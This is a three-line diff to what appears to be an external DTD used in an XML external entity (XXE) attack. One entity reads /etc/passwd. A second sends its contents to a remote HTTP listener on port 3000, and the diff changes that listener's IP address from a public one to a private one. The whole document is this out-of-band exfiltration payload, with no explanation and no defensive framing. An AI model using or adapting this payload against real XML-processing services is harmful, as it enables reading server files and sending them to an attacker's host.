@@ -1,3 +1,3 @@
 <!ENTITY % p1 SYSTEM "file:///etc/passwd">
-<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://213.233.103.110:3000//BLAH?%p1;'>">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://10.59.141.19:3000//BLAH?%p1;'>">
 %p2;
